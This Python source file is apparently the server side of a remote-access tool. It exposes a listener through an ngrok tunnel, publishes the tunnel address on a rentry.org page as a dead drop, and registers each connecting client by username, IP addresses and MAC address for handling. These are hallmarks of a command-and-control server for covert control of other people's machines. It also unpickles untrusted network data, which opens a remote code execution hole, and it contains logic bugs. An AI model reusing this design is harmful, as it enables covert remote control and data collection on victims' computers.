import socket, pyngrok
import pyngrok.ngrok

import hashlib, pickle
from typing import Optional

from time import sleep as _sleep

from .rentry import Rentry
from .enums import NetterClient, PacketType, ClientResponse
from .handler import ClientHandler
from .logger import Logging
from .bucket import ConnectionBucket


class ClientWrapper:
    BYTES_CHUNK: int = 2048

    def __init__(self, socket_: socket.socket, netServer: Optional["NetterServer"] = None, netClient=None) -> None:
        self.socket = socket_
        self.netServer: "NetterServer" = netServer
        self.netClient = netClient

        self.responseFunction: callable | None = None
        self.sending_state = False
        self.receiving_state = False

    def send_(self, packetType: PacketType, data: bytes | str | tuple) -> None:
        while self.sending_state:
            _sleep(0.1)

        self.sending_state = True

        try:
            data = pickle.dumps(data)

            packet_length: int = len(data).to_bytes(4, "big")
            packet_type: int = packetType.value.to_bytes(2, "little")

            self.socket.send(packet_length)
            self.socket.send(packet_type)

            for chunk in range(0, len(data), self.BYTES_CHUNK):
                self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])

            self.sending_state = False
        except ConnectionResetError:
            return

    def receive(self) -> ClientResponse:
        while self.receiving_state:
            _sleep(0.1)

        self.receiving_state = True

        try:
            packetLength: int = int.from_bytes(self.socket.recv(4), "big")

        except ConnectionResetError:
            return ClientResponse(PacketType.UNKNOWN, None)

        packet_type: int = int.from_bytes(self.socket.recv(2), "little")
        data, total_received = bytearray(), 0

        while total_received < packetLength:
            chunk = self.socket.recv(min(self.BYTES_CHUNK, packetLength - total_received))

            if not chunk:
                raise RuntimeError("Socket connection broken")

            data.extend(chunk)
            total_received += len(chunk)

        _consoles = [PacketType.CONSOLE_INFO, PacketType.CONSOLE_ERROR, PacketType.CONSOLE_WARNING]
        data = pickle.loads(data)
        self.receiving_state = False

        if packet_type in _consoles and self.netServer:
            self.netServer.console_log(data, level=PacketType._value2member_map_[packet_type].name[8:])
            return len(data)

        return ClientResponse(PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN), data)


class NetterServer(Logging, ConnectionBucket):
    bindAddress: tuple[str, int] = None

    ngrokAddress: str = None
    rentryUrlName: str = None
    rentryEditCode: str = None

    _logs: list = None

    def __init__(self, bind_address: Optional[tuple[str, int]] = None, ngrokConfig: Optional[pyngrok.ngrok.PyngrokConfig] = None) -> None:

        super().__init__(self)

        self.ngrokConfig: pyngrok.ngrok.PyngrokConfig = ngrokConfig
        self.bindAddress = bind_address if bind_address else ("localhost", 5000)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.selectedClient: NetterClient = None
        self.alive = True

    def startNgrokTunnel(self, useRentry=False):
        """
        This function starts a Ngrok tunnel and optionally updates a Rentry.org entry with the tunnel's address.

        Parameters:
        - useRentry (bool): If True, the function will attempt to update a Rentry.org entry with the tunnel's address.
        - rentryEditCode (str): The edit code for the Rentry.org entry. If useRentry is True and this is not provided,
            the function will raise a ValueError.

        Returns:
        - str: The Ngrok tunnel's address.

        Raises:
        - ValueError: If useRentry is True and rentryEditCode is not provided.
        """

        if not (self.rentryUrlName):
            raise ValueError("rentryUrlName must be set before startNgrokTunnel()")

        if not (self.ngrokConfig):
            raise ValueError("ngrokConfig must be set before startNgrokTunnel()")

        _tunnel = pyngrok.ngrok.connect(self.bindAddress[1], "tcp", pyngrok_config=self.ngrokConfig)
        self.ngrokAddress = _tunnel.public_url[6:]
        self.console_log(
            "Ngrok tunnel started at %s" % self.ngrokAddress,
        )

        if useRentry:
            Rentry.edit(
                urlName=self.rentryUrlName,
                edit_code=self.rentryEditCode,
                text=self.ngrokAddress,
            )

            if (rentryContent := Rentry.get_content("https://rentry.org/" + self.rentryUrlName)) is None:
                self.console_log("Failed to fetch content from Rentry.org (rentryUrlName not valid)")
                return

            if (rentryContent.content if rentryContent.content else rentryContent.title) != self.ngrokAddress:
                self.console_log("Failed to edit content for %s" % self.rentryUrlName)
            else:
                self.console_log("Ngrok address is now accessible through `%s`" % self.rentryUrlName)

        return self.ngrokAddress

    def listen(self):
        try:
            if not (self.ngrokConfig):
                raise ValueError("ngrokConfig must be set before listen()")

            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.bindAddress)
            self.socket.listen(5)

            self.console_log(
                "Server is listening on %s:%s" % self.bindAddress,
            )

            while self.alive is True:
                clientSocket: ClientWrapper = ClientWrapper(self.socket.accept()[0], self)

                if not (data := clientSocket.receive()).packetType == PacketType.DEVICE_INFORMATION:
                    break

                if _deviceInformation := pickle.loads(data.data):
                    device: NetterClient = NetterClient(
                        clientSocket,
                        hashlib.sha256(str(_deviceInformation["MAC_Address"] + _deviceInformation["Username"]).encode("UTF-8")).hexdigest(),
                        _deviceInformation["Username"],
                        _deviceInformation["Public_IP"],
                        _deviceInformation["Local_IP"],
                    )

                    clientSocket.netClient = device
                    exception = ["Username", "Public_IP", "Local_IP", "MAC_Address"]

                    for attributes in _deviceInformation.items():
                        if attributes[0] in exception:
                            continue

                        setattr(device, attributes[0], attributes[1])

                    self.append(device)
                    ClientHandler(clientSocket, device, self).start()

        except Exception as e:
            self.console_log(str(e))
